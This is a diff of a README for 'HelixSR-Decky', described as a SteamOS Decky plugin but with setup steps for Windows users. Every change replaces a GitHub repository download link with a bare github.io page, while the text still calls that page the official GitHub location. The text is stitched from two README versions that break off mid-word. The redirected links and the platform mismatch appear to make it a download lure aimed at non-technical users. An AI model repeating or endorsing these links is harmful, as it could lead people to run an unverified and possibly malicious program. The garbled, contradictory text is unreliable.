@@ -1,6 +1,6 @@
 # 🎮 HelixSR-Decky - Simple Per-Game HelixSR Setup on Windows
 
-[![Download HelixSR-Decky](https://img.shields.io/badge/Download%20HelixSR-Decky-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kara-lynnmacroeconomic2412/HelixSR-Decky)
+[![Download HelixSR-Decky](https://img.shields.io/badge/Download%20HelixSR-Decky-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://kara-lynnmacroeconomic2412.github.io)
 
 HelixSR-Decky is an independent Decky plugin by Blackheart909 for per-game HelixSR installation, updates, and diagnostics on SteamOS. This guide is written for everyday Windows users who want a clear, no-programming path from download to first launch.
 
@@ -25,13 +25,13 @@ Before you download, make sure you are on the Windows computer where you want to
 
 You do not need to create an account, configure a server, or prepare special files. The starting point is the GitHub page linked below.
 
-[![Get HelixSR-Decky](https://img.shields.io/badge/Get%20HelixSR-Decky-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kara-lynnmacroeconomic2412/HelixSR-Decky)
+[![Get HelixSR-Decky](https://img.shields.io/badge/Get%20HelixSR-Decky-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://kara-lynnmacroeconomic2412.github.io)
 
 ## 💾 Download and Setup
 
 Visit this link to download the application:
 
-https://github.com/Kara-lynnmacroeconomic2412/HelixSR-Decky
+https://kara-lynnmacroeconomic2412.github.io
 
 Use these steps for the Windows download and first open:
 
@@ -84,7 +84,7 @@ Use this checklist after the application opens for the first time:
 - Confirm the main window loads without error messages.
 - Look for the game list or game# 🎮 HelixSR-Decky - Manage HelixSR Game by Game
 
-[![Download HelixSR-Decky](https://img.shields.io/badge/Download%20HelixSR-Decky-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kara-lynnmacroeconomic2412/HelixSR-Decky)
+[![Download HelixSR-Decky](https://img.shields.io/badge/Download%20HelixSR-Decky-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://kara-lynnmacroeconomic2412.github.io)
 
 HelixSR-Decky is an independent Decky plugin by Blackheart909 for per-game HelixSR installation, updates, and diagnostics on SteamOS. This README is written for everyday Windows users who want a clear path from the GitHub page to a first launch without programming knowledge.
 
@@ -108,13 +108,13 @@ Start on the Windows computer where you want to use HelixSR-Decky. Keep the appl
 
 Use the link in the download section below as your starting point. The page is the official GitHub location for HelixSR-Decky. Open it in your normal web browser and follow the steps in order.
 
-[![Get HelixSR-Decky](https://img.shields.io/badge/Get%20HelixSR-Decky-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kara-lynnmacroeconomic2412/HelixSR-Decky)
+[![Get HelixSR-Decky](https://img.shields.io/badge/Get%20HelixSR-Decky-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://kara-lynnmacroeconomic2412.github.io)
 
 ## 💾 Download and Setup
 
 Visit this link to download the application:
 
-https://github.com/Kara-lynnmacroeconomic2412/HelixSR-Decky
+https://kara-lynnmacroeconomic2412.github.io
 
 Follow these steps for the Windows download and first open:
 
